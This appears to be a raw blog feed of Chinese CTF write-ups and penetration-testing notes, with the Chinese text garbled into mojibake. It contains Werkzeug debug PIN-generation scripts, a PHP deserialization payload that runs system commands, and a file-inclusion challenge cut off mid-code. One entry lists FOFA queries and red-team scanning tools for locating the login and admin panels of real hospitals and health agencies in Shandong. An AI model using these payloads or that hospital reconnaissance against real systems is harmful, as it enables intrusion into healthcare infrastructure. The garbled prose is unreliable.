class="string">&#x27;</span>flag&#123;873894c49201cd995ee2c52e6270630d&#125;<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/images/polarctf/image-20240116151400389.png" alt="image-20240116151400389"></p><h6 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h6><p>è¿™é‡Œä¸€å®šè¦æ³¨æ„ä¸åŒçš„pythonç‰ˆæœ¬çš„è®¡ç®—pinå€¼æ˜¯ä¸åŒçš„ï¼Œ<br><code>python3.5çš„get_machine_id()å€¼ä¸º/etc/machine-id+/proc/self/cgroup</code><br>ä¸‹é¢æ˜¯è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.5/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377892354&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="comment">#/sys/class/net/eth0/address</span></span><br><span class="line">    <span class="string">&#x27;32e48d371198e8420c53b0a1fa37e94d&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id+/proc/self/cgroup</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>python3.6</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#MD5</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">     <span class="string">&#x27;flaskweb&#x27;</span><span class="comment"># username</span></span><br><span class="line">     <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">     <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">     <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">     <span class="string">&#x27;25214234362297&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">     <span class="string">&#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">   num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">          rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                      <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">          rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>python3.7</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#MD5</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">     <span class="string">&#x27;flaskweb&#x27;</span><span class="comment"># username</span></span><br><span class="line">     <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">     <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">     <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"> </span><br><span class="line">private_bits = [</span><br><span class="line">     <span class="string">&#x27;25214234362297&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">     <span class="string">&#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"> </span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"> </span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">   num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"> </span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">          rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                      <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">          rv = num</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>python3.8çš„machine_idç”±ä¸‰ä¸ªåˆæˆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span><span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># é»˜è®¤å€¼</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># é»˜è®¤å€¼</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span> <span class="comment"># æŠ¥é”™å¾—åˆ°</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377581187&#x27;</span>,<span class="comment">#  /sys/class/net/eth0/address 16è¿›åˆ¶è½¬10è¿›åˆ¶</span></span><br><span class="line">    <span class="comment">#machine_idç”±ä¸‰ä¸ªåˆå¹¶(dockerå°±åä¸¤ä¸ª)ï¼š1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span></span><br><span class="line">    <span class="string">&#x27;653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd&#x27;</span><span class="comment">#  /proc/self/cgroup</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="php-very-nice"><a href="#php-very-nice" class="headerlink" title="php very nice"></a>php very nice</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Example</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="variable">$sys</span>=<span class="string">&#x27;system(&quot;ls&quot;);&#x27;</span>;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;sys);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Example();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$s</span>);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line"> http:<span class="comment">//3b626d75-482d-4c21-a603-ee2c36749c68.www.polarctf.com:8090/?a=O:7:&quot;Example&quot;:1:&#123;s:3:&quot;sys&quot;;s:23:&quot;system(&#x27;cat flag.php&#x27;);&quot;;&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>mimikatzç”¨æ³•</title>
      <link href="/2023/12/01/mimikatz%E7%94%A8%E6%B3%95/mimikatz%E7%94%A8%E6%B3%95/"/>
      <url>/2023/12/01/mimikatz%E7%94%A8%E6%B3%95/mimikatz%E7%94%A8%E6%B3%95/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>shizhanzhongdeyixietips</title>
      <link href="/2023/11/29/shizhanzhongdeyixietips/"/>
      <url>/2023/11/29/shizhanzhongdeyixietips/</url>
      
        <content type="html"><![CDATA[<h5 id="fofa"><a href="#fofa" class="headerlink" title="fofa"></a>fofa</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">country=&quot;CN&quot;&amp;&amp;(title=&quot;åŒ»ç–—&quot;||title=&quot;åŒ»é™¢&quot;)&amp;&amp;city=&quot;å±±ä¸œ&quot;</span><br><span class="line"></span><br><span class="line">title=&quot;ç›®æ ‡åç§°&quot; &amp;&amp; </span><br><span class="line">region=&quot;shandong&quot; </span><br><span class="line">city=&quot;jinan&quot;</span><br><span class="line">(title=&quot;åŒ»é™¢&quot; || title=&quot;åŒ»ç–—&quot; || title=&quot;å«ç”Ÿå¥åº·&quot;|| title=&quot;å«å¥å§”&quot; || body=&quot;åŒ»ç–—&quot;)&amp;&amp; region=&quot;å±±ä¸œçœ&quot; </span><br><span class="line">cert=&quot;ç›®æ ‡åŸŸåæˆ–è€…è¯ä¹¦å…³é”®å­—&quot; &amp;&amp; region=&quot;xxçœ&quot; </span><br><span class="line">cert=&quot;åŒ»ç–—&quot; &amp;&amp; city=&quot;æµå—å¸‚&quot; </span><br><span class="line">((title=&quot;ç›®æ ‡åç§°&quot; || host=&quot;ç›®æ ‡åŸŸå&quot;) &amp;&amp; country=&quot;CN&quot;) &amp;&amp; region!=&quot;HK&quot;</span><br><span class="line">app=&quot;ThinkPHP&quot; &amp;&amp; (status_code=&quot;200&quot; || banner=&quot;HTTP/1.1 200 OK&quot;) &amp;&amp; country=&quot;CN&quot;</span><br><span class="line">(title=&quot;åŒ»é™¢&quot; || title=&quot;åŒ»ç–—&quot; || title=&quot;å«ç”Ÿå¥åº·&quot; || title=&quot;å«å¥å§”&quot; || title=&quot;åŒ»é™¢åå°&quot; ) &amp;&amp; region=&quot;Shandong&quot;</span><br><span class="line">`https://buaq.net/go-145641.html`</span><br><span class="line"></span><br><span class="line">title=&quot;ç™»é™†&quot; &amp;&amp; &quot;æµå—å¸‚&quot; &amp;&amp; &quot;åŒ»é™¢&quot; &amp;&amp; country=&quot;CN&quot; &amp;&amp; region!=&quot;HK&quot;  é¸¡è‚‹</span><br><span class="line">title=&quot;ç®¡ç†&quot; &amp;&amp; &quot;XXå¸‚&quot; &amp;&amp; &quot;XXåŒ»é™¢&quot; &amp;&amp; country=&quot;CN&quot; &amp;&amp; region!=&quot;HK&quot;</span><br><span class="line">title=&quot;ç³»ç»Ÿ&quot; &amp;&amp; &quot;XXå¸‚&quot; &amp;&amp; &quot;XXåŒ»é™¢&quot; &amp;&amp; country=&quot;CN&quot; &amp;&amp; region!=&quot;HK&quot;</span><br><span class="line">title=&quot;æµ‹è¯•&quot; &amp;&amp; &quot;XXå¸‚&quot; &amp;&amp; &quot;XXåŒ»é™¢&quot; &amp;&amp; country=&quot;CN&quot; &amp;&amp; region!=&quot;HK&quot;ç­‰ç­‰Â·Â·Â·</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(title=&quot;å¨æµ·å¸‚ç«‹åŒ»é™¢&quot; || title=&quot;å«å¥å§”&quot; || title=&quot;å«ç”Ÿå¥åº·&quot; || title=&quot;åŒ»é™¢åå°&quot; || title=&quot;åŒ»é™¢ç™»å½•åå°&quot;||title=&quot;åŒ»é™¢åå°ç™»å½•&quot;) &amp;&amp; region=&quot;Shandong&quot;</span><br><span class="line">ä¸æ˜¯å¾ˆå‡†</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="fofaå·¥å…·"><a href="#fofaå·¥å…·" class="headerlink" title="fofaå·¥å…·"></a>fofaå·¥å…·</h5><h6 id="FofaMap"><a href="#FofaMap" class="headerlink" title="FofaMap"></a>FofaMap</h6><p><a href="https://github.com/asaotomo/FofaMap">https://github.com/asaotomo/FofaMap</a></p><p>å¯ä»¥è”åŠ¨nucleiè¿›è¡Œæ¼æ´æ‰«æï¼Œä½†æ˜¯æ„Ÿè§‰è¿˜æ˜¯å¾ˆé¸¡è‚‹  æ…¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/lemonlove7/EHole_magic</span><br><span class="line">fofaè”åŠ¨EHole åœ¨pocæ‰«æ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https://github.com/0x727/ShuiZe_0x727</span><br><span class="line">ç»™ä¸ªå…³é”®å­—ï¼Œè‡ªåŠ¨æ”¶é›†,ç”¨èµ·æ¥è¿˜å¯ä»¥ï¼Œè‡ªåŠ¨åŠ è½½poc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https://github.com/EASY233/Finger</span><br><span class="line">ä¸€æ¬¾çº¢é˜Ÿåœ¨å¤§é‡çš„èµ„äº§ä¸­å­˜æ´»æ¢æµ‹ä¸é‡ç‚¹æ”»å‡»ç³»ç»ŸæŒ‡çº¹æ¢æµ‹å·¥å…·</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https://github.com/EdgeSecurityTeam/EHole</span><br><span class="line">EHole(æ£±æ´)3.0 çº¢é˜Ÿé‡ç‚¹æ”»å‡»ç³»ç»ŸæŒ‡çº¹æ¢æµ‹å·¥å…·</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://www.a-hospital.com/w/%E5%B1%B1%E4%B8%9C%E7%9C%81%E4%B8%89%E7%BA%A7%E7%94%B2%E7%AD%89%E5%8C%BB%E9%99%A2%E5%88%97%E8%A1%A8</span><br><span class="line">å±±ä¸œæ‰€æœ‰ä¸‰ç”²ä¸‰ä¹™åŒ»é™¢</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://wsjkw.shandong.gov.cn/</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF2023å…¬å¼€èµ›é“WEEK3</title>
      <link href="/2023/11/27/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93WEEK2/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93WEEK3/"/>
      <url>/2023/11/27/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93WEEK2/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93WEEK3/</url>
      
        <content type="html"><![CDATA[<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h5 id="Include-ğŸ"><a href="#Include-ğŸ" class="headerlink" title="Include ğŸ"></a>Include ğŸ</h5><p>ç»å…¸æ–‡ä»¶åŒ…å«å†™shellï¼Œè¿›è¡Œrceï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        <span class="comment"># Something in phpinfo.php!</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span 